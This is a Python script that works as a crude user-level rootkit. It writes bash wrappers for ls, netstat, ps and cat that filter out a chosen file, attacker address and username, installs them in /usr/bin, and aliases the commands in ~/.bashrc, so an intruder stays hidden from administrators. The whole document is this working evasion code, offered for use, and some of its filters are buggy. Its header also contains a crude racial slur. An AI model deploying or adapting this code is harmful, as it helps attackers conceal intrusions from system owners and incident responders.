#!/usr/bin/python
# ----------------------------------------------------------------------------- 
#
# A very simple method for hiding from ps, netstat, etc w/out replacing bins.
# We apply alias with filters to all the commands that might show our presence.
#
# Commands we target are: 
#  killall 
#  ls          - done 
#  netstat     - done
#  passwd
#  ps          - done, sort of.
#  pidof
#  sudoers, 
#  syslogd
#  top
#  htop
#  cat (against say /etc/passwd) - done, sort of 
#
#
# Shoutz: ohdae & bindshell crew. 
#
# Qoutez: Niga Holla Back!
#
# Author: sk / ski@countermail.com
# -----------------------------------------------------------------------------

import sys
import os
import subprocess

def usage():
  print("%s -u <username> -h <hostname> -f <filename>" % sys.argv[0])

if len(sys.argv) != 7:
  usage()
  exit(0)

usernameToHide    = sys.argv[2]
hostAddressToHide = sys.argv[4]
fileToHide        = sys.argv[6]

print("[x] Creating aliases")

lsBash = "#!/bin/bash\n_ls() {\n\tif [[ $1 =~ 'l' ]]\n\tthen\n\t\tls $1 | sed -e '/"+fileToHide+"/d'\n\telse\n\t\tls $1 | sed -e '/"+fileToHide+"/d' | sed ':a;N;$!ba;s/\\n/ /g'\n\tfi\n}\n_ls $1 "
fDes   = open('.ls.bash', 'w')
fDes.write(lsBash)
fDes.close()

netstatBash = "#!/bin/bash\n_netstat() {\n\tnetstat $1 | sed '/%s/d'\n}\n_netstat $1" % hostAddressToHide
fDes = open('.netstat.bash', 'w')
fDes.write(netstatBash)
fDes.close()

psBash = "#!/bin/bash\n_ps() {\n\tif [ -z \"$1\" ]\n\tthen\n\t\tps\n\telse\n\t\tps $1 | sed -e 'd/%s/'\n\tfi\n}\n_ps $1" % usernameToHide
fDes = open('.ps.bash', 'w')
fDes.write(psBash)
fDes.close()

catBash = "#!/bin/bash\n_cat() {\n\tcat $1 | sed -e '/%s:/d' | sed -e '/%s/d'\n}\n_cat $1" % (usernameToHide, hostAddressToHide)
fDes = open('.cat.bash', 'w')
fDes.write(catBash)
fDes.close()

print("[x] Applying aliases")
os.system("chmod +x .ls.bash")
os.system('echo alias ls=".ls.bash" >> ~/.bashrc')
os.system('echo alias netstat=".netstat.bash" >> ~/.bashrc')
os.system('echo alias ps=".ps.bash" >> ~/.bashrc')
os.system('echo alias cat=".cat.bash" >> ~/.bashrc')
os.system('mv .ls.bash /usr/bin')
os.system('mv .netstat.bash /usr/bin')
os.system('mv .ps.bash /usr/bin')
os.system('mv .cat.bash /usr/bin')

# You have to source manually ...
# source ~/.bashrc